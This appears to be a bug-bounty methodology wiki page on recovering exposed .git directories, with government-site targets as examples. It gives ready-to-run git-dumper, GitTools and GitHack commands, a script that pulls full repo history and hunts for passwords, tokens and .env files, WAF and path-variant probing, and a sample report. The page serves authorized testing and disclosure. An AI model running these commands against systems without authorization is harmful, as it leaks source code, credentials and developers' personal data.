---
type: wiki
category: tool
tool: git-dumper,githack,gittools
status: active
last-updated: 2026-04-21
---

# Tool: git-dumper + GitHack + GitTools (.git leak recovery)

> **Purpose:** When a target exposes `/.git/`, **fully recover the repo history** locally, then dig deeper with `git log` / trufflehog.
> The three tools each have trade-offs — **it's recommended to run all of them** (see CLAUDE.md "a .git leak must be verified with multiple tools").

## Comparison of the three tools

| Tool | Pros | Cons |
|------|------|------|
| **git-dumper** | ✅ Most stable ✅ Recovers commit history | Occasionally misses files |
| **GitTools (Extractor)** | ✅ Recovers multiple commit versions ✅ Fills gaps git-dumper misses | More complex commands |
| **GitHack** | ✅ No dependencies ✅ Stable | Only grabs files at current HEAD |

**Recommended flow:** git-dumper → GitTools → GitHack (fallback)

## git-dumper (first choice)

### Installation

```bash
pip3 install git-dumper

# or clone
git clone https://github.com/arthaud/git-dumper
cd git-dumper && pip3 install -r requirements.txt
```

### Basic usage

```bash
# Recover to ./dump/
git-dumper https://target.gov.tw/.git/ ./dump

# More threads (faster)
git-dumper --jobs 20 https://target/.git/ ./dump

# With auth
git-dumper -H 'Cookie: sess=xxx' https://target/.git/ ./dump

# With UA
git-dumper --user-agent 'Mozilla/5.0' https://target/.git/ ./dump
```

### Post-recovery checks

```bash
cd dump
git status
git log --oneline
git log --all --full-history  # view history across all branches
git branch -a                 # list all branches
git stash list                # check for stashes

# Find interesting commits
git log --all --full-history -- "*password*" "*.env" "*.sql" "*secret*"

# Show full diff for a commit
git show abc123

# View a historical version of a config file
git show HEAD:config/database.yml
git show HEAD~5:config/database.yml
```

## GitTools (supplementary)

### Installation

```bash
git clone https://github.com/internetwache/GitTools.git
```

### Recover multiple versions with Extractor

```bash
# 1. Dump first
./GitTools/Dumper/gitdumper.sh https://target/.git/ ./dump

# 2. Extract each commit with Extractor
./GitTools/Extractor/extractor.sh ./dump ./extracted

# This produces multiple directories:
# ./extracted/0-commit_hash1/
# ./extracted/1-commit_hash2/
# ./extracted/2-commit_hash3/
# Each represents the full file state at one commit

# Find historical password changes
diff -r ./extracted/0-xxx/config ./extracted/1-yyy/config
```

### Use Finder to find .git across domains

```bash
./GitTools/Finder/gitfinder.py -i subs.txt -o found.txt
```

## GitHack (fallback)

### Installation

```bash
git clone https://github.com/lijiejie/GitHack.git
cd GitHack
pip3 install -r requirements.txt
```

### Basic usage

```bash
python2 GitHack.py https://target.gov.tw/.git/

# Creates a target.gov.tw_xxx/ directory
# No history included, but stable
```

## Full workflow (recommended)

```bash
#!/bin/bash
TARGET_URL="$1"  # e.g. https://target.gov.tw
TARGET_NAME=$(echo "$TARGET_URL" | sed 's|https\?://||' | tr / _)

mkdir -p "./recovered/$TARGET_NAME"
cd "./recovered/$TARGET_NAME"

# 1. git-dumper (first choice)
echo "[1/3] git-dumper"
git-dumper "$TARGET_URL/.git/" ./dumper

# 2. GitTools Extractor (fill in history)
echo "[2/3] GitTools Extractor"
mkdir -p ./gittools
~/GitTools/Dumper/gitdumper.sh "$TARGET_URL/.git/" ./gittools
~/GitTools/Extractor/extractor.sh ./gittools ./gittools-extracted

# 3. GitHack (fallback)
echo "[3/3] GitHack"
python2 ~/GitHack/GitHack.py "$TARGET_URL/.git/"

# 4. Combined analysis
echo "=== git log ==="
cd dumper && git log --oneline | head -20

echo "=== Find password / secret / token ==="
git log --all --full-history -- "*password*" "*secret*" "*token*" "*.env" "*.sql"

echo "=== Scan with trufflehog ==="
trufflehog git file://. --only-verified
```

## Advanced analysis

### 1. Find deleted sensitive files

```bash
cd dumper

# View all files that ever existed
git log --all --name-only --pretty=format: | sort -u

# Find files that once existed but are now gone
git log --all --diff-filter=D --name-only | sort -u
```

### 2. Find historical versions of a config file

```bash
# All versions of a file
git log --all --follow -- config/database.yml

# View the file at a specific commit
git show abc123:config/database.yml

# Compare current vs. a historical version
git diff HEAD abc123 -- config/database.yml
```

### 3. Extract remote URL (possible clue to a private repo)

```bash
cat .git/config
# [remote "origin"]
#   url = https://internal-gitlab.company.com/team/project.git
```

### 4. Check reflog / logs/HEAD (deployment server info)

```bash
cat .git/logs/HEAD
# Contains user.email + user.name = developer identity
# May be a supplier's employee email
```

### 5. Scan for sensitive strings

```bash
# Using grep
git grep -i "password\|secret\|api_key\|token" $(git rev-list --all)

# Using trufflehog (most recommended)
trufflehog git file:///path/to/dumper --only-verified

# Using gitleaks (alternative)
gitleaks detect --source=. -v
```

## Common issues

### Error: Not a git repository

```bash
# git-dumper didn't grab .git/HEAD → check manually
curl -sI https://target/.git/HEAD
curl -s https://target/.git/HEAD  # should show "ref: refs/heads/main"

# May be a reverse-proxy restriction: try different paths
curl -sI https://target/legacy/.git/HEAD
curl -sI https://target/v1/.git/HEAD
```

### Error: can't fetch packed refs

```bash
# Use GitHack as a fallback
python2 GitHack.py https://target/.git/
```

### 403 or 404 on specific objects

```bash
# WAF blocking .pack files
# Try probing whether .idx / .pack prefixes are reachable:
curl -I https://target/.git/objects/pack/
curl -s https://target/.git/objects/info/packs
```

### Only /.git/HEAD exists, but no /.git/config

```bash
# Possible honeypot (using .git/HEAD as bait)
# Confirm: if the recovered repo is empty → it's a honeypot
cd dumper && git log 2>&1 | head
```

## bbflow integration

```bash
# hunt-git-exposure detects .git exposure and checks for honeypots
bbflow hunt target --only git-exposure
```

## Common path variants

```bash
# /.git/ direct
/.git/config
/.git/HEAD

# Subdirectories (some systems set the web root in a subdirectory)
/subfolder/.git/config
/v1/.git/config
/legacy/.git/config
/beta/.git/config

# Case variations
/.GIT/config
/.Git/config
```

In practice: use `hunt-git-exposure` or ffuf to scan these variants.

## Report writing

```markdown
## Vulnerability Summary
https://target.gov.tw/.git/ is anonymously downloadable, exposing the full repo history, including:
- 142 commits of history
- 3 sets of developer emails (leaked from git log)
- Historical config/database.yml containing DB_PASSWORD (already rotated, but still a historical PII leak)

## Reproduction Steps
```bash
# 1. Confirm .git is exposed
curl -sI https://target.gov.tw/.git/HEAD
# HTTP/1.1 200 OK

# 2. Recover the repo
pip3 install git-dumper
git-dumper https://target.gov.tw/.git/ ./dump

# 3. Verify history
cd dump && git log --oneline | head -10
# abc123 Fix login bug
# def456 Update DB password
# ...

# 4. Extract sensitive content
git log --all -- "*.env" "*.yml"
git show abc123:config/database.yml
```

## Impact
- Source code leak spanning 142 commits
- 3 sets of developer emails (potentially usable for phishing)
- Historical DB password leak (value: xxx****yyy)

## Severity
P2-HIGH (if the historical password is still valid → P1)
```

## Related files

- [10-hunter-config-leak.md](10-hunter-config-leak.md) — `.git/` detection
- [27-tool-trufflehog.md](27-tool-trufflehog.md) — Scan for secrets after recovery
- [02-gov-site-quick-wins.md](02-gov-site-quick-wins.md) §#1
